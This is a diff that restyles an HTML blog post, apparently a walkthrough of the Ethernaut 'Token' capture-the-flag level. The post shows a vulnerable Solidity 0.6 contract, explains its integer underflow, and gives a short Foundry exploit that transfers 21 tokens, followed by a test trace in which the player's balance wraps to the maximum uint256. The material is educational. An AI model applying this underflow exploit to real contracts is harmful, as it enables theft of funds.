@@ -43,13 +43,19 @@ Here is the original Token contract:
 
   
   
-  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.1fcaf868e247e0175202d2fe4516e33a7bdb47365e90fe92409b3f14b2036b72.css" integrity="sha256-H8r4aOJH4BdSAtL&#43;RRbjOnvbRzZekP6SQJs/FLIDa3I=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.f457e937e31d731408def5c4e09a8bc48156362889abb942912d05a8243264a6.css" integrity="sha256-9FfpN&#43;MdcxQI3vXE4JqLxIFWNiiJq7lCkS0FqCQyZKY=" crossorigin="anonymous" media="screen" />
 
 
 
 
 
   
+  
+    
+    
+    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.58002408d8b6590c4b5ea8cc6e50bb088510809eae7e48d72d44762e7e7481af.css" integrity="sha256-WAAkCNi2WQxLXqjMblC7CIUQgJ6ufkjXLUR2Ln50ga8=" crossorigin="anonymous" media="screen" />
+  
+
 
 
    
@@ -80,8 +86,16 @@ Here is the original Token contract:
 
 
 
-<body class="preload-transitions colorscheme-light">
+
+
+<body class="preload-transitions colorscheme-dark">
   
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
 
   <main class="wrapper">
     <nav class="navigation">
@@ -192,26 +206,26 @@ Here is the original Token contract:
         <p>We start with the 20 tokens. To complete this challenge we need
 to get some more.</p>
 <p>Here is the original <code>Token</code> contract:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888">// SPDX-License-Identifier: MIT
-</span></span></span><span style="display:flex;"><span><span style="color:#888"></span><span style="color:#080;font-weight:bold">pragma solidity</span> ^<span style="color:#00d;font-weight:bold">0</span>.<span style="color:#00d;font-weight:bold">6</span>.<span style="color:#00d;font-weight:bold">0</span>;
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#007f7f">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">pragma solidity</span> ^<span style="color:#ff0;font-weight:bold">0</span>.<span style="color:#ff0;font-weight:bold">6</span>.<span style="color:#ff0;font-weight:bold">0</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#080;font-weight:bold">contract</span> <span style="color:#b06;font-weight:bold">Token</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">mapping</span>(<span style="color:#888;font-weight:bold">address</span> =&gt; <span style="color:#888;font-weight:bold">uint256</span>) balances;
-</span></span><span style="display:flex;"><span>    <span style="color:#888;font-weight:bold">uint256</span> <span style="color:#080;font-weight:bold">public</span> totalSupply;
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> Token {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">mapping</span>(<span style="color:#fff;font-weight:bold">address</span> =&gt; <span style="color:#fff;font-weight:bold">uint256</span>) balances;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">public</span> totalSupply;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">constructor</span>(<span style="color:#888;font-weight:bold">uint256</span> _initialSupply) {
-</span></span><span style="display:flex;"><span>        balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] = totalSupply = _initialSupply;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(<span style="color:#fff;font-weight:bold">uint256</span> _initialSupply) {
+</span></span><span style="display:flex;"><span>        balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] = totalSupply = _initialSupply;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">transfer</span>(<span style="color:#888;font-weight:bold">address</span> _to, <span style="color:#888;font-weight:bold">uint256</span> _value) <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">bool</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#038">require</span>(balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] - _value &gt;= <span style="color:#00d;font-weight:bold">0</span>);
-</span></span><span style="display:flex;"><span>        balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] -= _value;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> transfer(<span style="color:#fff;font-weight:bold">address</span> _to, <span style="color:#fff;font-weight:bold">uint256</span> _value) <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] - _value &gt;= <span style="color:#ff0;font-weight:bold">0</span>);
+</span></span><span style="display:flex;"><span>        balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] -= _value;
 </span></span><span style="display:flex;"><span>        balances[_to] += _value;
-</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">return</span> <span style="color:#080;font-weight:bold">true</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">true</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">balanceOf</span>(<span style="color:#888;font-weight:bold">address</span> _owner) <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">view</span> <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">uint256</span> <span style="color:#038">balance</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">return</span> balances[_owner];
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> balanceOf(<span style="color:#fff;font-weight:bold">address</span> _owner) <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">view</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">balance</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> balances[_owner];
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h2 id="analysis">
@@ -222,11 +236,11 @@ to get some more.</p>
 </h2>
 <p>Let&rsquo;s go line by line and see what we can come up with.</p>
 <p>Firstly, let&rsquo;s review the <code>transfer</code> function:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">transfer</span>(<span style="color:#888;font-weight:bold">address</span> _to, <span style="color:#888;font-weight:bold">uint256</span> _value) <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">bool</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#038">require</span>(balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] - _value &gt;= <span style="color:#00d;font-weight:bold">0</span>);
-</span></span><span style="display:flex;"><span>    balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] -= _value;
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> transfer(<span style="color:#fff;font-weight:bold">address</span> _to, <span style="color:#fff;font-weight:bold">uint256</span> _value) <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">require</span>(balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] - _value &gt;= <span style="color:#ff0;font-weight:bold">0</span>);
+</span></span><span style="display:flex;"><span>    balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] -= _value;
 </span></span><span style="display:flex;"><span>    balances[_to] += _value;
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">return</span> <span style="color:#080;font-weight:bold">true</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">true</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>In Solidity <code>&lt;0.8</code> integers overflow/underflow without error and
 arithmetic operations always wrap. In Solidity <code>&gt;=0.8</code> the
@@ -235,11 +249,11 @@ compiler throws an error on over- and underflow thanks to
 in overflow checking</a>. The <code>Token</code> contract uses Solidity
 <code>^0.6.0</code>, which means it is vulnerable to integer
 overflows/underflows.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#038">require</span>(balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] - _value &gt;= <span style="color:#00d;font-weight:bold">0</span>);
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">require</span>(balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] - _value &gt;= <span style="color:#ff0;font-weight:bold">0</span>);
 </span></span></code></pre></div><p>This check doesn&rsquo;t help given that the contract uses an unsigned
 integers for <code>balances</code>.</p>
 <p>Let&rsquo;s go over the part that does arithmetics:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] -= _value;
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] -= _value;
 </span></span><span style="display:flex;"><span>balances[_to] += _value;
 </span></span></code></pre></div><p>We know that <code>balances[player]</code> equals <code>20</code>. It means to
 overflow our balance we need to pass at least <code>21</code>.</p>
@@ -247,24 +261,24 @@ overflow our balance we need to pass at least <code>21</code>.</p>
 <code>solidity &lt;0.8</code> behavior, we have to slightly modify the code of
 this challenge and wrap arithmetics with the <code>unchecked</code>
 statement:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">transfer</span>(<span style="color:#888;font-weight:bold">address</span> _to, <span style="color:#888;font-weight:bold">uint256</span> _value) <span style="color:#080;font-weight:bold">public</span> <span style="color:#080;font-weight:bold">returns</span> (<span style="color:#888;font-weight:bold">bool</span>) {
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">unchecked</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#038">require</span>(balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] - _value &gt;= <span style="color:#00d;font-weight:bold">0</span>);
-</span></span><span style="display:flex;"><span>        balances[<span style="color:#038">msg</span>.<span style="color:#038">sender</span>] -= _value;
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> transfer(<span style="color:#fff;font-weight:bold">address</span> _to, <span style="color:#fff;font-weight:bold">uint256</span> _value) <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unchecked</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] - _value &gt;= <span style="color:#ff0;font-weight:bold">0</span>);
+</span></span><span style="display:flex;"><span>        balances[<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>] -= _value;
 </span></span><span style="display:flex;"><span>        balances[_to] += _value;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">return</span> <span style="color:#080;font-weight:bold">true</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">true</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The exploit is simple:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#080;font-weight:bold">function</span> <span style="color:#06b;font-weight:bold">exploit</span>() <span style="color:#080;font-weight:bold">internal</span> <span style="color:#080;font-weight:bold">override</span> {
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> exploit() <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">override</span> {
 </span></span><span style="display:flex;"><span>    vm.startPrank(player);
-</span></span><span style="display:flex;"><span>    level.<span style="color:#038">transfer</span>(<span style="color:#888;font-weight:bold">address</span>(<span style="color:#00d;font-weight:bold">0</span>), <span style="color:#00d;font-weight:bold">21</span>);
+</span></span><span style="display:flex;"><span>    level.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#ff0;font-weight:bold">0</span>), <span style="color:#ff0;font-weight:bold">21</span>);
 </span></span><span style="display:flex;"><span>    vm.stopPrank();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>The trace:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#038">test</span> --match-contract TokenTest -vvvv
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#fff;font-weight:bold">test</span> --match-contract TokenTest -vvvv
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Running <span style="color:#00d;font-weight:bold">1</span> <span style="color:#038">test</span> <span style="color:#080;font-weight:bold">for</span> src/test/Token.t.sol:TokenTest
+</span></span><span style="display:flex;"><span>Running <span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">test</span> <span style="color:#fff;font-weight:bold">for</span> src/test/Token.t.sol:TokenTest
 </span></span><span style="display:flex;"><span>[PASS] testToken() (gas: 319929)
 </span></span><span style="display:flex;"><span>Traces:
 </span></span><span style="display:flex;"><span>  [319929] TokenTest::testToken()
@@ -273,10 +287,10 @@ statement:</p>
 </span></span><span style="display:flex;"><span>    │   │   └─ ← ()
 </span></span><span style="display:flex;"><span>    │   ├─ [232204] Ethernaut::createLevelInstance(TokenFactory: [...])
 </span></span><span style="display:flex;"><span>    │   │   ├─ [180641] TokenFactory::createInstance(player: [...])
-</span></span><span style="display:flex;"><span>    │   │   │   ├─ [120540] → new Token@<span style="color:#d20;background-color:#fff0f0">&#34;0x037f…dd8f&#34;</span>
-</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#00d;font-weight:bold">380</span> bytes of code
+</span></span><span style="display:flex;"><span>    │   │   │   ├─ [120540] → new Token@<span style="color:#0ff;font-weight:bold">&#34;0x037f…dd8f&#34;</span>
+</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#ff0;font-weight:bold">380</span> bytes of code
 </span></span><span style="display:flex;"><span>    │   │   │   ├─ [22893] Token::transfer(player: [...], 20)
-</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    │   │   │   └─ ← Token: [...]
 </span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog(player: player: [...], instance: Token: [...])
 </span></span><span style="display:flex;"><span>    │   │   └─ ← Token: [...]
@@ -284,7 +298,7 @@ statement:</p>
 </span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [...])
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
 </span></span><span style="display:flex;"><span>    ├─ [22893] Token::transfer(0x0000000000000000000000000000000000000000, 21)
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
 </span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [...])
@@ -292,15 +306,15 @@ statement:</p>
 </span></span><span style="display:flex;"><span>    ├─ [4586] Ethernaut::submitLevelInstance(Token: [...])
 </span></span><span style="display:flex;"><span>    │   ├─ [1539] TokenFactory::validateInstance(Token: [...], player: [...])
 </span></span><span style="display:flex;"><span>    │   │   ├─ [529] Token::balanceOf(player: [...]) [staticcall]
-</span></span><span style="display:flex;"><span>    │   │   │   └─ <span style="color:#00d;font-weight:bold">115792089237316195423570985008687907853269984665640564039457584007913129639935</span>
-</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    │   │   │   └─ <span style="color:#ff0;font-weight:bold">115792089237316195423570985008687907853269984665640564039457584007913129639935</span>
+</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog(player: player: [...], level: TokenFactory: [...])
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#038">true</span>
+</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#fff;font-weight:bold">true</span>
 </span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
 </span></span><span style="display:flex;"><span>    │   └─ ← ()
 </span></span><span style="display:flex;"><span>    └─ ← ()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Test result: ok. <span style="color:#00d;font-weight:bold">1</span> passed; <span style="color:#00d;font-weight:bold">0</span> failed; finished in 1.00ms
+</span></span><span style="display:flex;"><span>Test result: ok. <span style="color:#ff0;font-weight:bold">1</span> passed; <span style="color:#ff0;font-weight:bold">0</span> failed; finished in 1.00ms
 </span></span></code></pre></div><h2 id="lessons-learned">
   Lessons learned
   <a class="heading-link" href="#lessons-learned">
@@ -400,7 +414,7 @@ walkthrough, Ethernaut, #7 Delegation</a>!</p>
 
   
   
-  <script src="https://vyorkin.org/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js" integrity="sha256-I2BJOV3DaC&#43;ycZZAhylY4S8fJAZ7sJwyeyM&#43;YpDH7aw="></script>
+  <script src="https://vyorkin.org/js/coder.min.b9a9a8f029e2fd416957bf8489db1b684799393553df358655a1b614ec7c5ef9.js" integrity="sha256-uamo8Cni/UFpV7&#43;EidsbaEeZOTVT3zWGVaG2FOx8Xvk="></script>
   
 
   
